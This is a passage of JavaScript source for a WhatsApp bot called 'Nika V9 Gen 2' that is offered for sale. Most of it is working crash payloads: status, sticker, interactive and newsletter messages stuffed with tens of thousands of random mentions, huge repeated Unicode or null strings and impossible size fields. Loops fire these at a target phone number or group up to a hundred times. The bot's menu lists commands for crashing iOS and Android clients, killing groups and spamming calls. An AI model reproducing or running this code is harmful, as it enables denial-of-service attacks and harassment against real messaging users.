            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await depayy.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function bulldozer(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await depayy.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function delay1(target, mention) {
    const glitchText = "𓆩⛧𓆪".repeat(3000) + "\n" + "‎".repeat(3000); // simbol + invisible
    
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: `╔═━━━✥◈✥━━━═╗\n  惡𝐃𝐄𝐏𝐀𝐘...| 𝐒𝐔𝐍𝐆𝐎𝐃𝐍𝐈𝐊𝐀☀\n╚═━━━✥◈✥━━━═╝\n${glitchText}`,
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9999,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await depayy.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await depayy.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "⚠️ SAHRIL VIEWONCE BUG V4" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function nikadelay2(target, mention = false, delayMs = 500) {
    for (const targett of target) {
        const generateMessage = {
            viewOnceMessage: {
                message: {
                    imageMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                        mimetype: "image/jpeg",
                        caption: "? ???????-?",
                        fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                        fileLength: "19769",
                        height: 354,
                        width: 783,
                        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                        fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                        directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                        mediaKeyTimestamp: "1743225419",
                        jpegThumbnail: null,
                        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                        scanLengths: [2437, 17332],
                        contextInfo: {
                            mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                            isSampled: true,
                            participant: target,
                            remoteJid: "status@broadcast",
                            forwardingScore: 9741,
                            isForwarded: true
                        }
                    }
                }
            }
        };

        const msg = generateWAMessageFromContent(target, generateMessage, {});
        
        await depayy.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        });

        if (mention) {
            await depayy.relayMessage(
                target,
                {
                    statusMentionMessage: {
                        message: {
                            protocolMessage: {
                                key: msg.key,
                                type: 25
                            }
                        }
                    }
                },
                {
                    additionalNodes: [
                        {
                            tag: "meta",
                            attrs: { is_status_mention: "???? ???????? - ????" },
                            content: undefined
                        }
                    ]
                }
            );
        }

        // Delay antar jid
        await new Promise(res => setTimeout(res, delayMs));
    }
}

//=================[ FUNCTION BUG GROUP ]===================//
async function Blanking(isTarget) {
let msg = generateWAMessageFromContent(isTarget, proto.Message.fromObject({
viewOnceMessage: {
message: {
interactiveMessage: {
contextInfo: {
mentionedJid: [isTarget],
isForwarded: true,
forwardingScore: 999,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363409362506610@newsletter",
newsletterName: "𝐍𝐈𝐊𝐀 ☀" + "ꦾ".repeat(120000),
serverMessageId: 1
}
},
header: {
title: "",
...(await prepareWAMessageMedia({
image: {  
url: "https://img12.pixhost.to/images/1242/581026965_media.jpg",
gifPlayback: true
}
}, {
upload: depayy.waUploadToServer,
mediaType: "image"
})),
hasMediaAttachment: true
},
body: { text: "" },
footer: { text: "𝐍𝐈𝐊𝐀☀" },
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: `{"title":"${"ꦾ".repeat(60000)}","sections":[{"title":"Flow Button","rows":[]}]}`
},
{
name: "quick_reply",
buttonParamsJson: `{"display_text": "", "id": ""}`
},
{
name: "cta_url",
buttonParamsJson: `{"display_text": "", "url": "", "merchant_url": ""}`
},
{ name: "mpm", buttonParamsJson: "{}" },
{ name: "payment_method", buttonParamsJson: "{}" },
{ name: "call_permission_request", buttonParamsJson: "{}" },
{ name: "form_message", buttonParamsJson: "{}" },
{ name: "wa_payment_learn_more", buttonParamsJson: "{}" },
{ name: "wa_payment_transaction_details", buttonParamsJson: "{}" },
{ name: "wa_payment_fbpin_reset", buttonParamsJson: "{}" },
{ name: "catalog_message", buttonParamsJson: "{}" },
{ name: "payment_info", buttonParamsJson: "{}" },
{ name: "review_order", buttonParamsJson: "{}" },
{ name: "send_location", buttonParamsJson: "{}" },
{ name: "payments_care_csat", buttonParamsJson: "{}" },
{ name: "view_product", buttonParamsJson: "{}" },
{ name: "payment_settings", buttonParamsJson: "{}" },
{ name: "address_message", buttonParamsJson: "{}" },
{ name: "automated_greeting_message_view_catalog", buttonParamsJson: "{}" },
{ name: "open_webview", buttonParamsJson: "{}" },
{ name: "message_with_link_status", buttonParamsJson: "{}" },
{ name: "payment_status", buttonParamsJson: "{}" },
{ name: "extensions_message_v2", buttonParamsJson: "{}" },
{ name: "landline_call", buttonParamsJson: "{}" },
{ name: "review_and_pay", buttonParamsJson: "{}" },
{
name: "galaxy_message",
buttonParamsJson: `{
"screen_2_OptIn_0": true,
"screen_2_OptIn_1": true,
"screen_1_Dropdown_0": "Null",
"screen_1_DatePicker_1": "1028995200000",
"screen_1_TextInput_2": "tamaryuichix@gmail.com",
"screen_1_TextInput_3": "94643116",
"screen_0_TextInput_0": "radio - buttons${"\0".repeat(100000)}",
"screen_0_TextInput_1": "Anjay",
"screen_0_Dropdown_2": "001-Grimgar",
"screen_0_RadioButtonsGroup_3": "0_true",
"flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
}`,
version: 3
}
]
}
}
}
}
}), { userJid: isTarget, quoted: null });

await depayy.relayMessage(isTarget, msg.message, { messageId: msg.key.id });
}

async function stcGc(target) {
        let sticker = []
        for (let anu = 0; anu < 1000; anu++) {
            sticker.push({
                fileName: '8kblA1s0k900pbLI6X2S6Y7uSr-r751WIUrQOt5-A3k=.webp',
                isAnimated: true,
                accessibilityLabel: '',
                isLottie: false,
                mimetype: 'image/webp'
            })
        }
        const Msg = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    },
                    stickerPackMessage: {
                        stickerPackId: "76cd3656-3c76-4109-9b37-62c8a668329f",
                        name: "WOI GRUP KONTOL",
                        publisher: "",
                        stickers: sticker,
                        fileLength: "999999999999999",
                        fileSha256: "NURKD/76ZOetxqc+V8dT/zJYRhpHZi9FYgAGNzdQQyM=",
                        fileEncSha256: "/CkFScxebuRGVejPQ8NE0ounWX35rtq+PmkweWejtEs=",
                        mediaKey: "AEkmhMTtPLPha2rHdxtWQtqXBH+g9Jo/+gUw1erHM9s=",
                        directPath: "/v/t62.15575-24/29442218_1217419543131080_7836347641742653699_n.enc?ccb=11-4&oh=01_Q5Aa1QEZWzSJqGIwOUkeDSvpdnDSvVIvGUyVvW_uvgP5uTOePQ&oe=68403E51&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "99999999",
                        trayIconFileName: "e846de1c-ff5f-4768-9ed4-a3ed1c531fe0.png",
                        thumbnailDirectPath: "AjvV1BsQbp1IdsGb4sO/F1O8N6w60Pi2bgimTw/52KU=",
                        thumbnailSha256: "qRcSAXa8fdBBSrYwhAf6Gg7PkjFPbpDqHCo/Keic5O8=",
                        thumbnailEncSha256: "J7OubZTyLsE/VEQ8fRniRwyjB/fMfWbrCxXG0pGkgZ4=",
                        thumbnailHeight: 99999999999,
                        thumbnailWidth: 9999999999,
                        imageDataHash: "OWY2MjQ0MmMzNGFhZThkOTY5YWM2M2RlMzAyNjg0OGNmZTBkMTMwNTBlYmE0YzAxNzhiMDdkMTBiNzM1NzdlYg==",
                        stickerPackSize: 9999999999999,
                        stickerPackOrigin: 9999999999999,
                        contextInfo: {
                            mentionedJid: Array.from({
                                length: 30000
                            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                            isSampled: true,
                            participant: target,
                            remoteJid: target,
                            forwardingScore: 9741,
                            isForwarded: true,
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                            externalAdReply: {
                                title: "𝐃𝐄𝐏𝐀𝐘 𝐈𝐒 𝐇𝐄𝐑𝐄",
                                body: "Grup Kontol"
                            },
                        }
                    }
                }
            }
        }
        await depayy.relayMessage(target, Msg, {})
    }

//FUNCT BUG GROUP VAMPIRE, #THANKS VAMP   
async function VampireBugIns(target) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "𝐍𝐈𝐊𝐀 ☀ 𝐊𝐈𝐋𝐋 𝐆𝐑𝐎𝐔𝐏" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(500000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Vampire",
                    },
                ],
            },
        };

        await depayy.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}

async function VampireGroupInvis(target, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "𝐍𝐈𝐊𝐀 ☀" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0018".repeat(50000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Vampire Official",
                    },
                ],
            },
        };

        await depayy.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}   


async function VampKilliPhone(target) {
for (let i = 0; i < 60; i++) {
await VampCrashIos(target);
await VampiPhone(target);
await VampCrashIos(target);
await VampDelayMess(target);
await VampCrash(target);
await VampDelayMess(target);
}
console.log(chalk.blue(`Sending Crash Hard to ${target}☠️`));
}

async function depayyblank(target) {
for (let i = 0; i <= 100; i++) {
await Blankhard(target);
await bugdepay3(target);
await Crashblank(target);
await bugdepay4(target);
await blanks(target);
await bugdepay2(target);
}
console.log(chalk.blue(`Sending Crash Hard to ${target}☠️`));
} 

async function depayynew1(target) {
for (let i = 0; i <= 100; i++) {
await protocolbug5(target);
await protocolbug5(target);
await protocolbug5(target);
await bulldozer(target);
await protocolbug5(target);
await delay1(target);
await delay1(target);
await bulldozer(target);
await delay1(target);
await delay1(target);
await bulldozer(target);
await delay1(target);
await delay1(target);
await bulldozer(target);
await delay1(target);
await delay1(target);
}
console.log(chalk.blue(`Sending Crash Hard to ${target}☠️`));
} 

async function depayynew2(target) {
for (let i = 0; i <= 100; i++) {
await protocolbug5(target);
await protocolbug5(target);
await protocolbug5(target);
await protocolbug5(target);
await bulldozer(target);
await delay1(target);
await delay1(target);
await bulldozer(target);
}
console.log(chalk.blue(`Sending Crash Hard to ${target}☠️`));
} 

async function depayblanknew(target) {
for (let i = 0; i <= 50; i++) {
await Blankhard(target);
await sleep(5000)    
await bugdepay3(target);
await sleep(5000)      
await invicXblank(target); 
await sleep(5000)       
await bugdepay4(target);
await sleep(5000)        
await bugdepay3(target);
await sleep(5000)        
await bugdepay2(target);
await sleep(5000)      
await Blankhard(target);
await sleep(5000)      
await bugdepay3(target);
await sleep(5000)      
await invicXblank(target); 
await sleep(5000)        
await bugdepay4(target);
await sleep(5000)      
await Blankhard(target);
await sleep(5000)        
await bugdepay2(target);
}
console.log(chalk.blue(`Sending Crash Hard to ${target}☠️`));
}
//END
const xxpayreply = (teks) => {
depayy.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: "ℕ𝕚𝕜𝕒 𝕍𝕖𝕣𝕤𝕚𝕠𝕟 𝟡",
body: '© Depayy',
thumbnailUrl: 'https://files.catbox.moe/xcymoq.jpg',
sourceUrl: "https://whatsapp.com/channel/0029Vb8yDHFAYlUJ2er9370V",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: lol });
}

const payreply = (teks) => {
        return depayy.sendMessage(m.chat, {text: teks,  contextInfo: {
            document: fs.readFileSync("./package.json"),
            filename: `depayy`,
            mimetype: 'application/pdf',
	fileLength: 99999999999999999999999999999999999999,
    pageCount: 10909143,	
                    mentionedJid: [m.sender],
                    externalAdReply: {
                        showAdAttribution: true,
                        title: `𝐕𝟗 𝐆𝐄𝐍 𝟐`,
                        body: `☀`,
                        previewType: "PHOTO",
                        thumbnail: yuda,
                        sourceUrl: ``                   }
                }}, {quoted: lol})}
 
const Reply = (teks) => {
        return depayy.sendMessage(m.chat, {text: teks,  contextInfo: {
            document: fs.readFileSync("./package.json"),
            filename: `depayy`,
            mimetype: 'application/pdf',
	fileLength: 99999999999999999999999999999999999999,
    pageCount: 10909143,	
                    mentionedJid: [m.sender],
                    externalAdReply: {
                        showAdAttribution: true,
                        title: `𝐕𝟗 𝐆𝐄𝐍 𝟐`,
                        body: `☀`,
                        previewType: "PHOTO",
                        thumbnail: yuda,
                        sourceUrl: ``                   }
                }}, {quoted: lol})}
                 
const buttonpayreply = (teks) => {
  const buttons = [
    {
    buttonId: '.owner',
    buttonText: {
      displayText: 'Developer'
    }
  },
  {
    buttonId: '.buysc',
    buttonText: {
      displayText: 'Buy Script'
      }
    }
  ];

  const buttonMessage = {
    image: { url: `https://files.catbox.moe/x6hgad.jpg` },
    caption: teks,
    footer: 'Nika V9 Gen 2',
    buttons: buttons,
    headerType: 6,
    contextInfo: { 
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363409362506610@newsletter",
        serverMessageId: null,
        newsletterName: `𝐍𝐢𝐤𝐚 𝐕𝟗 𝐆𝐞𝐧 𝟐`
      },
      mentionedJid: ['13135550002@s.whatsapp.net'],
    },
    viewOnce: true
  };

  return depayy.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
const xreplybugbutton = (teks) => {
  const buttons = [
    {
    buttonId: '.owner',
    buttonText: {
      displayText: 'Developer'
      }
    }
  ];

  const buttonMessage = {
    image: { url: `https://files.catbox.moe/x6hgad.jpg` },
    caption: teks,
    footer: 'Nika V9 Gen 2',
    buttons: buttons,
    headerType: 6,
    contextInfo: { 
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363409362506610@newsletter",
        serverMessageId: null,
        newsletterName: `𝐍𝐈𝐊𝐀 𝐕𝟗 𝐆𝐄𝐍 𝟐`
      },
      mentionedJid: ['13135550002@s.whatsapp.net'],
    },
    viewOnce: true
  };

  return depayy.sendMessage(m.chat, buttonMessage, { quoted: lol });
}

                
 async function databaserep(teks) {
 let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: "© NIKA V9 GEN 2"
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Buy Script\",\"url\":\"https://wa.me/6281257180104\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: lol}) 
await depayy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})	
}   


async function listbut2(chat, teks, listnye, lol) {
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 999999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363369514105242@newsletter",
newsletterName: `NIKA`,
serverMessageId: 145
}
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© Depayy`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: ``,
thumbnailUrl: "",
gifPlayback: true,
subtitle: "",
hasMediaAttachment: true,
...(await prepareWAMessageMedia({ image: { url: `https://files.catbox.moe/x6hgad.jpg` } }, { upload: depayy.waUploadToServer })),
}),
gifPlayback: true,
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listnye)
}],
}), })}
}}, {quoted: lol})
await depayy.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}


switch (command) {
case 'menu': {
await depayy.sendMessage(m.chat, { react: { text: "☀",key: m.key,}}); 
let teksnya = `张伟 hi, ${pushname} ${getGreeting()}, I'm Nika Whatsapp bot designed and designed with JavaScript technology to help you, use me wisely 

张伟 *NIKA V9 GEN 2*
[ ♢ ] Bot Information ♔
◎ Bot Name : Nika
◎ Creator : Depayy
◎ Version : 9.2.0 Vip!! 
◎ Runtime : ${runtime(process.uptime())}
◎ Type : Case
◎ Prefix : multi

Nika is ready to help you,Click the button and see what I can do 
`
    let buttons = [
        { buttonId: ".bugmenu", buttonText: { displayText: "—͟͞𝐁͢͡𝐔͠𝐆͠𝐌͠𝐄͠𝐍͠𝐔张伟" } },    
        { buttonId: ".funmenu", buttonText: { displayText: "—͟͞𝐅͢͡𝐔͠𝐍͡𝐌͠𝐄͠𝐍͠𝐔张伟" } }            
    ];

    let buttonMessage = {
        image: { url: `https://files.catbox.moe/iambv7.jpg` },        
        caption: teksnya,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `NIKA V9 GEN 2`,
                body: `© Depayy`,
                thumbnailUrl: `https://files.catbox.moe/caqc40.jpg`,
                sourceUrl: ` `,
                mediaType: 1,
                renderLargerThumbnail: true, 
            }
        },
        footer: "© D-Nika",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: "张伟",
                sections: [
                    {
                        title: "NIKA V9 GEN 2",
                        highlight_label: " ",
                        rows: [
                            { title: "OWNER MENU", description: "张伟", id: `.ownermenu` },                       
                            { title: "DEVELOPER", description: "张伟", id: `.owner` },
                            { title: "THANKS TO", description: "张伟", id: `.tqto` }, 
                            { title: "张伟", description: "♔", id: `.allmenu` }                      
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    // Push the new button properly
    buttonMessage.buttons.push(flowActions);

    await depayy.sendMessage(m.chat, buttonMessage, { quoted: lol });  
   await depayy.sendMessage(m.chat, { audio: fs.readFileSync('./image/musik1.mp3'), mimetype: 'audio/mpeg', ptt: true }, { quoted: qtext });     
}
break;

case 'funmenu': {
await depayy.sendMessage(m.chat, { react: { text: "☀",key: m.key,}}); 
let menu = `张伟 hi, ${pushname} ${getGreeting()}, I'm Nika Whatsapp bot designed and designed with JavaScript technology to help you, use me wisely 

张伟 *NIKA V9 GEN 2*
[ ♢ ] Bot Information ♔
◎ Bot Name : Nika
◎ Creator : Depayy
◎ Version : 9.2.0 Vip!! 
◎ Runtime : ${runtime(process.uptime())}
◎ Type : Case
◎ Prefix : multi

[ ♢ ] Fun Menu ♔
◇ .r34
◇ .hentaineko
◇ .tourl 
◇ .rvo 
◇ .swm 
◇ .sticker 
◇ .qc 
◇ .brat
◇ .bratvid
◇ .pin 
◇ .cekidch 
◇ .cekidgc 
◇ .yts 
◇ .tiktok 
◇ .capcut 
◇ .reactch 
◇ .sertifikattolol
◇ .cekkhodam 
◇ .cekganteng
◇ .hd 
`
  let buttons = [
    {
    buttonId: '.menu',
    buttonText: {
      displayText: '◇'
      }
    }
  ];

  let buttonMessage = {
    image: { url: `https://files.catbox.moe/x6hgad.jpg` },
    caption: menu,
    footer: 'Nika V9 Gen 2',
    buttons: buttons,
    headerType: 6,
    contextInfo: { 
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363409362506610@newsletter",
        serverMessageId: null,
        newsletterName: `𝐍𝐈𝐊𝐀 𝐕𝟗 𝐆𝐄𝐍 𝟐`
      },
      mentionedJid: ['13135550002@s.whatsapp.net'],
    },
    viewOnce: true
  };

  await depayy.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
break

case 'bugmenu': {
await depayy.sendMessage(m.chat, { react: { text: "☀",key: m.key,}}); 
let menu = `张伟 hi, ${pushname} ${getGreeting()}, I'm Nika Whatsapp bot designed and designed with JavaScript technology to help you, use me wisely 

张伟 *NIKA V9 GEN 2*
[ ♢ ] Bot Information ♔
◎ Bot Name : Nika
◎ Creator : Depayy
◎ Version : 9.2.0 Vip!! 
◎ Runtime : ${runtime(process.uptime())}
◎ Type : Case
◎ Prefix : multi

[ ♢ ] Bug Menu ♔
◇ .dep 628xxxx [ Button Bug ] 
◇ .invisible 628xxx
◇ .blanking 628xxx
◇ .delayhard 628xxx
◇ .comboblank 628xxx
◇ .delaycombo 628xxx
◇ .kill-ios 628xxx
◇ .crash-ios 628xxx

[ ♢ ] Bug Saluran ♔
◇ .bugch [ idch ]
◇ .crash-saluran [ idch ]

[ ♢ ] Bug Group ♔
◇ .blanking-group [ Link ]
◇ .delay-group [ Link ]
◇ .combobug-group [ Link ]

[ ♢ ] Spam Menu ♔
◇ .spampair 628xxx|50
◇ .spamcall 628xxxx
`
let buttons = [
    {
    buttonId: '.menu',
    buttonText: {
      displayText: '◇'
      }
    }
  ];

  let buttonMessage = {
    image: { url: `https://files.catbox.moe/x6hgad.jpg` },
    caption: menu,
    footer: 'Nika V9 Gen 2',
    buttons: buttons,
    headerType: 6,
    contextInfo: { 
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363409362506610@newsletter",
        serverMessageId: null,
        newsletterName: `𝐍𝐈𝐊𝐀 𝐕𝟗 𝐆𝐄𝐍 𝟐`
      },
      mentionedJid: ['13135550002@s.whatsapp.net'],
    },
    viewOnce: true
